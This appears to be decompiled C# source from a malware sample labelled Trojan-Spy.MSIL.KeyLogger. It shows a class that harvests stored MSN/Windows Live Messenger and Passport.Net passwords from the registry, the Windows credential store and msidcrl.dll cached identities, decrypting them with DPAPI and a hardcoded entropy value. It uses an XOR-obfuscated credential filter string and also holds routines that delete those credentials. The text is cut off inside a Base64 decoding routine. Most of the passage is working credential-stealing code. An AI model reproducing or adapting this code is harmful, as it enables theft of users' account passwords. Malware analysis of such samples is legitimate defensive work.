// Decompiled with JetBrains decompiler
// Type: Roy.CMSNMessengerPasswords
// Assembly: Roy, Version=2.3.3.234, Culture=neutral, PublicKeyToken=null
// MVID: 2E5855C9-3623-47AC-87B3-574423C889E6
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00002-msil\Trojan-Spy.MSIL.KeyLogger.ghj-a49d165972c0534f6ef5730aa1e0dd66ae9dc93656c6cd8ad725852281757a19.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Collections;
using System.Collections.Generic;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;

namespace Roy
{
  internal class CMSNMessengerPasswords : CUtils, IEnumerable<CMSNMessengerPassword>
  {
    private const int ERROR_SUCCESS = 0;
    private const int HKEY_CURRENT_USER = -2147483647;
    private const int READ_CONTROL = 131072;
    private const int STANDARD_RIGHTS_READ = 131072;
    private const int KEY_QUERY_VALUE = 1;
    private const int KEY_ENUMERATE_SUB_KEYS = 8;
    private const int KEY_NOTIFY = 16;
    private const int SYNCHRONIZE = 1048576;
    private const int STANDARD_RIGHTS_WRITE = 131072;
    private const int KEY_SET_VALUE = 2;
    private const int KEY_CREATE_SUB_KEY = 4;
    private const int KEY_READ = 131097;
    private const int KEY_WRITE = 131078;
    private const int CSIDL_PROGRAM_FILES = 38;
    private List<CMSNMessengerPassword> m_MSNPass;
    [SpecialName]
    private byte[] \u0024STATIC\u0024Base64Dec\u0024201E10E\u0024Enc;

    public CMSNMessengerPasswords() => this.m_MSNPass = new List<CMSNMessengerPassword>();

    [DllImport("kernel32.dll", EntryPoint = "lstrlenA", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int lstrlen([MarshalAs(UnmanagedType.VBByRefStr)] ref string lpString);

    [DllImport("advapi32.dll", EntryPoint = "CredEnumerateW", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int CredEnumerate(
      [MarshalAs(UnmanagedType.LPWStr)] string lpszFilter,
      int lFlags,
      ref int pCount,
      ref IntPtr lppCredentials);

    [DllImport("advapi32.dll", EntryPoint = "CredEnumerateW", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int CredEnumerate(
      IntPtr lpszFilter,
      int lFlags,
      ref int pCount,
      ref IntPtr lppCredentials);

    [DllImport("advapi32.dll", EntryPoint = "CredDeleteW", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int CredDelete([MarshalAs(UnmanagedType.LPWStr)] string lpwstrTargetName, int dwType, int dwFlags);

    [DllImport("advapi32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int CredFree(IntPtr pBuffer);

    [DllImport("crypt32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int CryptUnprotectData(
      ref CMSNMessengerPasswords.DATA_BLOB pDataIn,
      int ppszDataDescr,
      ref CMSNMessengerPasswords.DATA_BLOB pOptionalEntropy,
      int pvReserved,
      int pPromptStruct,
      int dwFlags,
      ref CMSNMessengerPasswords.DATA_BLOB pDataOut);

    [DllImport("crypt32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int CryptUnprotectData(
      ref CMSNMessengerPasswords.DATA_BLOB pDataIn,
      int ppszDataDescr,
      int pOptionalEntropy,
      int pvReserved,
      int pPromptStruct,
      int dwFlags,
      ref CMSNMessengerPasswords.DATA_BLOB pDataOut);

    [DllImport("advapi32.dll", EntryPoint = "RegOpenKeyExA", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int RegOpenKeyEx(
      int hKey,
      [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpSubKey,
      int ulOptions,
      int samDesired,
      ref int phkResult);

    [DllImport("advapi32.dll", EntryPoint = "RegQueryValueExA", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int RegQueryValueEx(
      int hKey,
      [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpValueName,
      int lpReserved,
      ref int lpType,
      [MarshalAs(UnmanagedType.LPWStr)] string lpData,
      ref int lpcbData);

    [DllImport("advapi32.dll", EntryPoint = "RegQueryValueExA", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int RegQueryValueEx(
      int hKey,
      [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpValueName,
      int lpReserved,
      ref int lpType,
      IntPtr lpData,
      ref int lpcbData);

    [DllImport("advapi32.dll", EntryPoint = "RegEnumKeyExA", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int RegEnumKeyEx(
      int hKey,
      int dwIndex,
      [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpName,
      ref int lpcbName,
      int lpReserved,
      [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpClass,
      int lpcbClass,
      ref CMSNMessengerPasswords.FILETIME lpftLastWriteTime);

    [DllImport("advapi32.dll", EntryPoint = "RegDeleteValueA", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int RegDeleteValue(int hKey, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpValueName);

    [DllImport("kernel32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int LocalFree(int hMem);

    [DllImport("advapi32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int RegCloseKey(int hKey);

    [DllImport("shell32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int SHGetSpecialFolderLocation(int hwndOwner, int nFolder, ref int pidl);

    [DllImport("shell32.dll", EntryPoint = "SHGetPathFromIDListA", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int SHGetPathFromIDList(int pidl, [MarshalAs(UnmanagedType.VBByRefStr)] ref string pszPath);

    [DllImport("msidcrl.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int Initialize(ref Guid guid, int IDCRLVersion, int dwFlags);

    [DllImport("msidcrl.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int EnumIdentitiesWithCachedCredentials(
      [MarshalAs(UnmanagedType.LPWStr)] string wszCachedCredType,
      ref int phEnumHandle);

    [DllImport("msidcrl.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int NextIdentity(int hEnumHandle, ref IntPtr lpwszMemberName);

    [DllImport("msidcrl.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int PassportFreeMemory(IntPtr ptr);

    [DllImport("msidcrl.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int CloseEnumIdentitiesHandle(int hEnumHandle);

    [DllImport("msidcrl.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int CreateIdentityHandle(
      [MarshalAs(UnmanagedType.LPWStr)] string wszMemberName,
      int dwFlags,
      ref int lphExternalIdentity);

    [DllImport("msidcrl.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int CreateIdentityHandle(
      IntPtr wszMemberName,
      int dwFlags,
      ref int lphExternalIdentity);

    [DllImport("msidcrl.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int HasPersistedCredential(
      int hExternalIdentity,
      [MarshalAs(UnmanagedType.LPWStr)] string wszCredType,
      ref int lpbPersisted);

    [DllImport("msidcrl.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int RemovePersistedCredential(int hExternalIdentity, [MarshalAs(UnmanagedType.LPWStr)] string wszCredType);

    [DllImport("msidcrl.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int GetIdentityPropertyByName(
      int hExternalIdentity,
      [MarshalAs(UnmanagedType.LPWStr)] string wszPropertyName,
      ref int lpszValue);

    [DllImport("msidcrl.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int BuildAuthTokenRequest(
      int hExternalIdentity,
      [MarshalAs(UnmanagedType.LPWStr)] string wszPolicy,
      int dwFlags,
      ref IntPtr lpReturn);

    [DllImport("msidcrl.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int CloseIdentityHandle(int hExternalIdentity);

    [DllImport("msidcrl.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int Uninitialize();

    [DllImport("kernel32.dll", EntryPoint = "LoadLibraryA", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int LoadLibrary([MarshalAs(UnmanagedType.VBByRefStr)] ref string lpLibFileName);

    [DllImport("kernel32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int FreeLibrary(int hLibModule);

    private string getProgramFilesFolderPath()
    {
      int pidl;
      string programFilesFolderPath;
      if (CMSNMessengerPasswords.SHGetSpecialFolderLocation(0, 38, ref pidl) == 0)
      {
        string pszPath = new string(char.MinValue, 512);
        CMSNMessengerPasswords.SHGetPathFromIDList(pidl, ref pszPath);
        programFilesFolderPath = Strings.Left(pszPath, checked (Strings.InStr(pszPath, "\0") - 1));
      }
      else
        programFilesFolderPath = (string) null;
      CMSNMessengerPasswords.LocalFree(pidl);
      return programFilesFolderPath;
    }

    private void getMSN75Passwords()
    {
      string lpLibFileName = this.getProgramFilesFolderPath() + "\\MSN Messenger\\msidcrl.dll";
      if (Operators.CompareString(FileSystem.Dir(lpLibFileName), (string) null, false) == 0)
        return;
      int hLibModule = CMSNMessengerPasswords.LoadLibrary(ref lpLibFileName);
      Guid guid = new Guid(1896408858, (short) -26330, (short) 20427, new byte[8]
      {
        (byte) 188,
        (byte) 201,
        (byte) 154,
        (byte) 157,
        (byte) 63,
        (byte) 50,
        (byte) 228,
        (byte) 35
      });
      CMSNMessengerPasswords.Initialize(ref guid, 1, 15);
      int phEnumHandle;
      IntPtr lpwszMemberName;
      int lphExternalIdentity;
      int lpbPersisted;
      int num1;
      if (CMSNMessengerPasswords.EnumIdentitiesWithCachedCredentials("ps:password", ref phEnumHandle) == 0)
      {
        for (int index = CMSNMessengerPasswords.NextIdentity(phEnumHandle, ref lpwszMemberName); index == 0; index = CMSNMessengerPasswords.NextIdentity(phEnumHandle, ref lpwszMemberName))
        {
          if (CMSNMessengerPasswords.CreateIdentityHandle(lpwszMemberName, (int) byte.MaxValue, ref lphExternalIdentity) == 0 & lpwszMemberName != IntPtr.Zero)
          {
            if (CMSNMessengerPasswords.HasPersistedCredential(lphExternalIdentity, "ps:password", ref lpbPersisted) == 0 & lpbPersisted != 0)
            {
              IntPtr lpReturn;
              if (CMSNMessengerPasswords.BuildAuthTokenRequest(lphExternalIdentity, "ps:password", 0, ref lpReturn) == 0)
              {
                string str1 = this.CopyString(lpReturn);
                int Start = checked (Strings.InStr(str1, "<wsse:Password>") + 15);
                int num2 = Strings.InStr(str1, "</wsse:Password>");
                if (num2 > 0)
                {
                  List<CMSNMessengerPassword> msnPass = this.m_MSNPass;
                  string str2 = this.CopyString(lpwszMemberName);
                  ref string local1 = ref str2;
                  string str3 = Strings.Mid(str1, Start, checked (num2 - Start));
                  ref string local2 = ref str3;
                  string str4 = "ps:" + this.CopyString(lpwszMemberName);
                  ref string local3 = ref str4;
                  CMSNMessengerPassword messengerPassword = new CMSNMessengerPassword(ref local1, ref local2, ref local3);
                  msnPass.Add(messengerPassword);
                }
              }
              if (lpReturn != IntPtr.Zero)
                CMSNMessengerPasswords.PassportFreeMemory(lpReturn);
            }
            num1 = CMSNMessengerPasswords.CloseIdentityHandle(lphExternalIdentity);
          }
          if (lpwszMemberName != IntPtr.Zero)
            CMSNMessengerPasswords.PassportFreeMemory(lpwszMemberName);
        }
      }
      CMSNMessengerPasswords.CloseEnumIdentitiesHandle(phEnumHandle);
      if (CMSNMessengerPasswords.EnumIdentitiesWithCachedCredentials("ps:membernameonly", ref phEnumHandle) == 0)
      {
        for (int index = CMSNMessengerPasswords.NextIdentity(phEnumHandle, ref lpwszMemberName); index == 0; index = CMSNMessengerPasswords.NextIdentity(phEnumHandle, ref lpwszMemberName))
        {
          if (CMSNMessengerPasswords.CreateIdentityHandle(lpwszMemberName, (int) byte.MaxValue, ref lphExternalIdentity) == 0 & lpwszMemberName != IntPtr.Zero)
          {
            if (CMSNMessengerPasswords.HasPersistedCredential(lphExternalIdentity, "ps:password", ref lpbPersisted) == 0 & lpbPersisted == 0)
            {
              List<CMSNMessengerPassword> msnPass = this.m_MSNPass;
              string str5 = this.CopyString(lpwszMemberName);
              ref string local4 = ref str5;
              string empty = string.Empty;
              ref string local5 = ref empty;
              string str6 = "ps:" + this.CopyString(lpwszMemberName);
              ref string local6 = ref str6;
              CMSNMessengerPassword messengerPassword = new CMSNMessengerPassword(ref local4, ref local5, ref local6);
              msnPass.Add(messengerPassword);
            }
            num1 = CMSNMessengerPasswords.CloseIdentityHandle(lphExternalIdentity);
          }
          if (lpwszMemberName != IntPtr.Zero)
            CMSNMessengerPasswords.PassportFreeMemory(lpwszMemberName);
        }
      }
      CMSNMessengerPasswords.CloseEnumIdentitiesHandle(phEnumHandle);
      CMSNMessengerPasswords.Uninitialize();
      CMSNMessengerPasswords.FreeLibrary(hLibModule);
    }

    public void Refresh()
    {
      this.m_MSNPass.Clear();
      string lpSubKey1 = "Software\\Microsoft\\MessengerService";
      int phkResult;
      int num1 = CMSNMessengerPasswords.RegOpenKeyEx(-2147483647, ref lpSubKey1, 0, 131097, ref phkResult);
      int cb1 = 0;
      int hKey1 = phkResult;
      string str1 = "PasswordMSN Messenger Service";
      ref string local1 = ref str1;
      int num2;
      ref int local2 = ref num2;
      IntPtr zero1 = IntPtr.Zero;
      ref int local3 = ref cb1;
      num1 = CMSNMessengerPasswords.RegQueryValueEx(hKey1, ref local1, 0, ref local2, zero1, ref local3);
      int cb2;
      string lpSubKey2;
      if (cb1 > 0)
      {
        IntPtr num3 = Marshal.AllocHGlobal(cb1);
        int hKey2 = phkResult;
        string str2 = "PasswordMSN Messenger Service";
        ref string local4 = ref str2;
        ref int local5 = ref num2;
        IntPtr lpData1 = num3;
        ref int local6 = ref cb1;
        num1 = CMSNMessengerPasswords.RegQueryValueEx(hKey2, ref local4, 0, ref local5, lpData1, ref local6);
        string stringAnsi1 = Marshal.PtrToStringAnsi(num3);
        Marshal.FreeHGlobal(num3);
        string Base64String = Strings.Mid(stringAnsi1, 1, checked (Strings.Len(stringAnsi1) - 1));
        string str3 = this.Base64Dec(ref Base64String);
        cb2 = 0;
        int hKey3 = phkResult;
        string str4 = "UserMSN Messenger Service";
        ref string local7 = ref str4;
        ref int local8 = ref num2;
        IntPtr zero2 = IntPtr.Zero;
        ref int local9 = ref cb2;
        num1 = CMSNMessengerPasswords.RegQueryValueEx(hKey3, ref local7, 0, ref local8, zero2, ref local9);
        IntPtr num4 = Marshal.AllocHGlobal(cb2);
        int hKey4 = phkResult;
        string str5 = "UserMSN Messenger Service";
        ref string local10 = ref str5;
        ref int local11 = ref num2;
        IntPtr lpData2 = num4;
        ref int local12 = ref cb2;
        num1 = CMSNMessengerPasswords.RegQueryValueEx(hKey4, ref local10, 0, ref local11, lpData2, ref local12);
        string stringAnsi2 = Marshal.PtrToStringAnsi(num4);
        Marshal.FreeHGlobal(num4);
        string str6 = Strings.Mid(stringAnsi2, 1, checked (Strings.Len(stringAnsi2) - 1));
        List<CMSNMessengerPassword> msnPass = this.m_MSNPass;
        ref string local13 = ref str6;
        ref string local14 = ref str3;
        lpSubKey2 = string.Empty;
        ref string local15 = ref lpSubKey2;
        CMSNMessengerPassword messengerPassword = new CMSNMessengerPassword(ref local13, ref local14, ref local15);
        msnPass.Add(messengerPassword);
        CMSNMessengerPasswords.RegCloseKey(phkResult);
      }
      CMSNMessengerPasswords.RegCloseKey(phkResult);
      lpSubKey2 = "Software\\Microsoft\\MSNMessenger";
      CMSNMessengerPasswords.DATA_BLOB pDataIn;
      CMSNMessengerPasswords.DATA_BLOB pDataOut;
      if (CMSNMessengerPasswords.RegOpenKeyEx(-2147483647, ref lpSubKey2, 0, 131097, ref phkResult) == 0)
      {
        cb2 = 0;
        int hKey5 = phkResult;
        lpSubKey2 = "Password.NET Messenger Service";
        ref string local16 = ref lpSubKey2;
        ref int local17 = ref num2;
        IntPtr zero3 = IntPtr.Zero;
        ref int local18 = ref cb2;
        if (CMSNMessengerPasswords.RegQueryValueEx(hKey5, ref local16, 0, ref local17, zero3, ref local18) == 0)
        {
          IntPtr num5 = Marshal.AllocHGlobal(cb2);
          int hKey6 = phkResult;
          lpSubKey2 = "Password.NET Messenger Service";
          ref string local19 = ref lpSubKey2;
          ref int local20 = ref num2;
          IntPtr lpData3 = num5;
          ref int local21 = ref cb2;
          if (CMSNMessengerPasswords.RegQueryValueEx(hKey6, ref local19, 0, ref local20, lpData3, ref local21) != 0)
            return;
          pDataIn.pbData = checked (num5.ToInt32() + 2);
          pDataIn.cbData = checked (cb2 - 2);
          CMSNMessengerPasswords.CryptUnprotectData(ref pDataIn, 0, 0, 0, 0, 1, ref pDataOut);
          string stringAnsi3 = Marshal.PtrToStringAnsi(num5);
          Marshal.FreeHGlobal(num5);
          string str7 = this.Base64Dec(ref stringAnsi3);
          cb2 = 0;
          int hKey7 = phkResult;
          lpSubKey2 = "User.NET Messenger Service";
          ref string local22 = ref lpSubKey2;
          ref int local23 = ref num2;
          IntPtr zero4 = IntPtr.Zero;
          ref int local24 = ref cb2;
          num1 = CMSNMessengerPasswords.RegQueryValueEx(hKey7, ref local22, 0, ref local23, zero4, ref local24);
          IntPtr num6 = Marshal.AllocHGlobal(cb2);
          int hKey8 = phkResult;
          lpSubKey2 = "User.NET Messenger Service";
          ref string local25 = ref lpSubKey2;
          ref int local26 = ref num2;
          IntPtr lpData4 = num6;
          ref int local27 = ref cb2;
          num1 = CMSNMessengerPasswords.RegQueryValueEx(hKey8, ref local25, 0, ref local26, lpData4, ref local27);
          string stringAnsi4 = Marshal.PtrToStringAnsi(num6);
          Marshal.FreeHGlobal(num6);
          string str8 = Strings.Mid(stringAnsi4, 1, checked (Strings.Len(stringAnsi4) - 1));
          List<CMSNMessengerPassword> msnPass = this.m_MSNPass;
          ref string local28 = ref str8;
          ref string local29 = ref str7;
          lpSubKey2 = string.Empty;
          ref string local30 = ref lpSubKey2;
          CMSNMessengerPassword messengerPassword = new CMSNMessengerPassword(ref local28, ref local29, ref local30);
          msnPass.Add(messengerPassword);
          CMSNMessengerPasswords.LocalFree(pDataOut.pbData);
        }
      }
      int pCount;
      IntPtr lppCredentials;
      CMSNMessengerPasswords.CredEnumerate("Passport.Net\\*", 0, ref pCount, ref lppCredentials);
      CMSNMessengerPasswords.CREDENTIAL credential1;
      CMSNMessengerPasswords.CREDENTIAL credential2;
      IntPtr ptr1;
      IntPtr ptr2;
      IntPtr ptr3;
      string str9;
      if (pCount > 0)
      {
        CMSNMessengerPasswords.DATA_BLOB pOptionalEntropy;
        pOptionalEntropy.cbData = 74;
        IntPtr num7 = Marshal.AllocHGlobal(74);
        string str10 = "82BD0E67-9FEA-4748-8672-D5EFE5B779B0\0";
        int num8 = 0;
        do
        {
          Marshal.WriteInt16(num7, checked (num8 * 2), checked ((short) (Strings.Asc(Strings.Mid(str10, num8 + 1, 1)) * 4)));
          checked { ++num8; }
        }
        while (num8 <= 36);
        pOptionalEntropy.pbData = num7.ToInt32();
        int num9 = checked (pCount - 1);
        int num10 = 0;
        while (num10 <= num9)
        {
          object structure = Marshal.PtrToStructure(Marshal.ReadIntPtr(lppCredentials, checked (num10 * 4)), credential1.GetType());
          credential1 = structure != null ? (CMSNMessengerPasswords.CREDENTIAL) structure : credential2;
          pDataIn.pbData = credential1.lpbCredentialBlob;
          pDataIn.cbData = credential1.dwCredentialBlobSize;
          pDataOut.cbData = 0;
          pDataOut.pbData = 0;
          CMSNMessengerPasswords.CryptUnprotectData(ref pDataIn, 0, ref pOptionalEntropy, 0, 0, 0, ref pDataOut);
          List<CMSNMessengerPassword> msnPass = this.m_MSNPass;
          ptr1 = new IntPtr(credential1.lpUserName);
          lpSubKey2 = this.CopyString(ptr1);
          ref string local31 = ref lpSubKey2;
          ptr2 = new IntPtr(pDataOut.pbData);
          string str11 = this.CopyString(ptr2);
          ref string local32 = ref str11;
          ptr3 = new IntPtr(credential1.lpstrTargetName);
          str9 = this.CopyString(ptr3);
          ref string local33 = ref str9;
          CMSNMessengerPassword messengerPassword = new CMSNMessengerPassword(ref local31, ref local32, ref local33);
          msnPass.Add(messengerPassword);
          CMSNMessengerPasswords.LocalFree(pDataOut.pbData);
          checked { ++num10; }
        }
        Marshal.FreeHGlobal(num7);
      }
      CMSNMessengerPasswords.CredFree(lppCredentials);
      this.getMSN75Passwords();
      CMSNMessengerPasswords.RegCloseKey(phkResult);
      byte[] numArray = new byte[18]
      {
        (byte) 38,
        (byte) 48,
        (byte) 111,
        (byte) 102,
        (byte) 81,
        (byte) 101,
        (byte) 56,
        (byte) 82,
        (byte) 98,
        (byte) 108,
        (byte) 78,
        (byte) 100,
        (byte) 103,
        (byte) 110,
        (byte) 90,
        (byte) 83,
        (byte) 85,
        (byte) 74
      };
      IntPtr num11 = Marshal.AllocHGlobal(38);
      int num12 = 0;
      do
      {
        byte val = checked ((byte) ((int) (byte) ((int) numArray[17 - num12] ^ 12) + (17 - num12)));
        Marshal.WriteInt16(num11, checked (num12 * 2), (short) val);
        checked { ++num12; }
      }
      while (num12 <= 17);
      Marshal.WriteInt16(num11, 36, (short) 0);
      CMSNMessengerPasswords.CredEnumerate(num11, 0, ref pCount, ref lppCredentials);
      if (pCount > 0)
      {
        int num13 = checked (pCount - 1);
        int num14 = 0;
        while (num14 <= num13)
        {
          object structure = Marshal.PtrToStructure(Marshal.ReadIntPtr(lppCredentials, checked (num14 * 4)), credential1.GetType());
          credential1 = structure != null ? (CMSNMessengerPasswords.CREDENTIAL) structure : credential2;
          pDataIn.pbData = credential1.lpbCredentialBlob;
          pDataIn.cbData = credential1.dwCredentialBlobSize;
          CMSNMessengerPasswords.CryptUnprotectData(ref pDataIn, 0, 0, 0, 0, 1, ref pDataOut);
          pDataOut.pbData = pDataIn.pbData;
          List<CMSNMessengerPassword> msnPass = this.m_MSNPass;
          ptr3 = new IntPtr(credential1.lpUserName);
          str9 = this.CopyString(ptr3);
          ref string local34 = ref str9;
          ptr2 = new IntPtr(pDataOut.pbData);
          string stringUni = Marshal.PtrToStringUni(ptr2, checked ((int) Math.Round(unchecked ((double) pDataIn.cbData / 2.0))));
          ref string local35 = ref stringUni;
          ptr1 = new IntPtr(credential1.lpstrTargetName);
          lpSubKey2 = this.CopyString(ptr1);
          ref string local36 = ref lpSubKey2;
          CMSNMessengerPassword messengerPassword = new CMSNMessengerPassword(ref local34, ref local35, ref local36);
          msnPass.Add(messengerPassword);
          checked { ++num14; }
        }
      }
      CMSNMessengerPasswords.CredFree(lppCredentials);
      Marshal.FreeHGlobal(num11);
    }

    private void DeleteAllCred(string lpszCredPattern)
    {
      int pCount;
      IntPtr lppCredentials;
      CMSNMessengerPasswords.CredEnumerate(lpszCredPattern, 0, ref pCount, ref lppCredentials);
      if (pCount > 0)
      {
        int num1 = checked (pCount - 1);
        int num2 = 0;
        while (num2 <= num1)
        {
          CMSNMessengerPasswords.CREDENTIAL credential1;
          object structure = Marshal.PtrToStructure(Marshal.ReadIntPtr(lppCredentials, checked (num2 * 4)), credential1.GetType());
          CMSNMessengerPasswords.CREDENTIAL credential2;
          credential1 = structure != null ? (CMSNMessengerPasswords.CREDENTIAL) structure : credential2;
          CMSNMessengerPasswords.CredDelete(this.CopyString(new IntPtr(credential1.lpstrTargetName)), credential1.dwType, credential1.dwFlags);
          checked { ++num2; }
        }
      }
      CMSNMessengerPasswords.CredFree(lppCredentials);
    }

    private void DeleteAllCred(IntPtr lpszCredPattern)
    {
      int pCount;
      IntPtr lppCredentials;
      CMSNMessengerPasswords.CredEnumerate(lpszCredPattern, 0, ref pCount, ref lppCredentials);
      if (pCount > 0)
      {
        int num1 = checked (pCount - 1);
        int num2 = 0;
        while (num2 <= num1)
        {
          CMSNMessengerPasswords.CREDENTIAL credential1;
          object structure = Marshal.PtrToStructure(Marshal.ReadIntPtr(lppCredentials, checked (num2 * 4)), credential1.GetType());
          CMSNMessengerPasswords.CREDENTIAL credential2;
          credential1 = structure != null ? (CMSNMessengerPasswords.CREDENTIAL) structure : credential2;
          CMSNMessengerPasswords.CredDelete(this.CopyString(new IntPtr(credential1.lpstrTargetName)), credential1.dwType, credential1.dwFlags);
          checked { ++num2; }
        }
      }
      CMSNMessengerPasswords.CredFree(lppCredentials);
    }

    public void Delete(string szTargetName)
    {
      byte[] numArray = new byte[18]
      {
        (byte) 38,
        (byte) 48,
        (byte) 111,
        (byte) 102,
        (byte) 81,
        (byte) 101,
        (byte) 56,
        (byte) 82,
        (byte) 98,
        (byte) 108,
        (byte) 78,
        (byte) 100,
        (byte) 103,
        (byte) 110,
        (byte) 90,
        (byte) 83,
        (byte) 85,
        (byte) 74
      };
      IntPtr num1 = Marshal.AllocHGlobal(38);
      int num2 = 0;
      do
      {
        byte val = checked ((byte) ((int) (short) ((int) numArray[17 - num2] ^ 12) + (17 - num2)));
        Marshal.WriteByte(num1, checked (num2 * 2), val);
        checked { ++num2; }
      }
      while (num2 <= 17);
      Marshal.WriteInt16(num1, 36, (short) 0);
      string lpSubKey1 = "Software\\Microsoft\\MessengerService";
      int phkResult;
      int num3 = CMSNMessengerPasswords.RegOpenKeyEx(-2147483647, ref lpSubKey1, 0, 131078, ref phkResult);
      int num4 = 0;
      int hKey1 = phkResult;
      string lpSubKey2 = "PasswordMSN Messenger Service";
      ref string local1 = ref lpSubKey2;
      int num5;
      ref int local2 = ref num5;
      IntPtr zero1 = IntPtr.Zero;
      ref int local3 = ref num4;
      num3 = CMSNMessengerPasswords.RegQueryValueEx(hKey1, ref local1, 0, ref local2, zero1, ref local3);
      if (num4 > 0)
      {
        int hKey2 = phkResult;
        lpSubKey2 = "PasswordMSN Messenger Service";
        ref string local4 = ref lpSubKey2;
        num3 = CMSNMessengerPasswords.RegDeleteValue(hKey2, ref local4);
      }
      CMSNMessengerPasswords.RegCloseKey(phkResult);
      lpSubKey2 = "Software\\Microsoft\\MSNMessenger";
      if (CMSNMessengerPasswords.RegOpenKeyEx(-2147483647, ref lpSubKey2, 0, 131097, ref phkResult) == 0)
      {
        num4 = 0;
        int hKey3 = phkResult;
        lpSubKey2 = "Password.NET Messenger Service";
        ref string local5 = ref lpSubKey2;
        ref int local6 = ref num5;
        IntPtr zero2 = IntPtr.Zero;
        ref int local7 = ref num4;
        num3 = CMSNMessengerPasswords.RegQueryValueEx(hKey3, ref local5, 0, ref local6, zero2, ref local7);
        if (num4 > 0)
        {
          int hKey4 = phkResult;
          lpSubKey2 = "Password.NET Messenger Service";
          ref string local8 = ref lpSubKey2;
          num3 = CMSNMessengerPasswords.RegDeleteValue(hKey4, ref local8);
          return;
        }
      }
      CMSNMessengerPasswords.RegCloseKey(phkResult);
      string lpLibFileName = this.getProgramFilesFolderPath() + "\\MSN Messenger\\msidcrl.dll";
      if (Operators.CompareString(FileSystem.Dir(lpLibFileName), (string) null, false) != 0)
      {
        int hLibModule = CMSNMessengerPasswords.LoadLibrary(ref lpLibFileName);
        Guid guid = new Guid(1896408858, (short) -26330, (short) 20427, new byte[8]
        {
          (byte) 188,
          (byte) 201,
          (byte) 154,
          (byte) 157,
          (byte) 63,
          (byte) 50,
          (byte) 228,
          (byte) 35
        });
        CMSNMessengerPasswords.Initialize(ref guid, 1, 15);
        if (Strings.Len(szTargetName) == 0)
        {
          int num6 = checked (this.m_MSNPass.Count - 1);
          int index = 0;
          while (index <= num6)
          {
            CMSNMessengerPassword messengerPassword = this.m_MSNPass[index];
            if (Strings.InStr(messengerPassword.TargetName, "ps:") == 1)
            {
              szTargetName = Strings.Mid(messengerPassword.TargetName, 4);
              int lphExternalIdentity;
              if (CMSNMessengerPasswords.CreateIdentityHandle(szTargetName, (int) byte.MaxValue, ref lphExternalIdentity) == 0)
              {
                num3 = CMSNMessengerPasswords.RemovePersistedCredential(lphExternalIdentity, "ps:password");
                num3 = CMSNMessengerPasswords.RemovePersistedCredential(lphExternalIdentity, "ps:membernameonly");
                num3 = CMSNMessengerPasswords.CloseIdentityHandle(lphExternalIdentity);
              }
            }
            checked { ++index; }
          }
        }
        else
        {
          szTargetName = Strings.Mid(szTargetName, 4);
          int lphExternalIdentity;
          if (CMSNMessengerPasswords.CreateIdentityHandle(szTargetName, (int) byte.MaxValue, ref lphExternalIdentity) == 0)
          {
            num3 = CMSNMessengerPasswords.RemovePersistedCredential(lphExternalIdentity, "ps:password");
            num3 = CMSNMessengerPasswords.RemovePersistedCredential(lphExternalIdentity, "ps:membernameonly");
            num3 = CMSNMessengerPasswords.CloseIdentityHandle(lphExternalIdentity);
          }
        }
        CMSNMessengerPasswords.Uninitialize();
        CMSNMessengerPasswords.FreeLibrary(hLibModule);
      }
      if (Strings.Len(szTargetName) == 0)
      {
        szTargetName = "Passport.Net\\*";
        this.DeleteAllCred(szTargetName);
        this.DeleteAllCred(num1);
      }
      else
        num3 = CMSNMessengerPasswords.CredDelete(szTargetName, 1, 0);
      if (Strings.Len(szTargetName) == 0)
      {
        szTargetName = "Passport.Net\\*";
        this.DeleteAllCred(szTargetName);
        this.DeleteAllCred(num1);
      }
      else
        num3 = CMSNMessengerPasswords.CredDelete(szTargetName, 4, 0);
      Marshal.FreeHGlobal(num1);
    }

    private string Base64Dec(ref string Base64String)
    {
      byte[] numArray = new byte[256];
      if (this.\u0024STATIC\u0024Base64Dec\u0024201E10E\u0024Enc.Length == 0)
        this.\u0024STATIC\u0024Base64Dec\u0024201E10E\u0024Enc = Encoding.ASCII.GetBytes("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/");
      int index1 = 0;
      do
      {
        numArray[index1] = (byte) 64;
        checked { ++index1; }
      }
      while (index1 <= (int) byte.MaxValue);
      int index2 = 0;
      do
      {
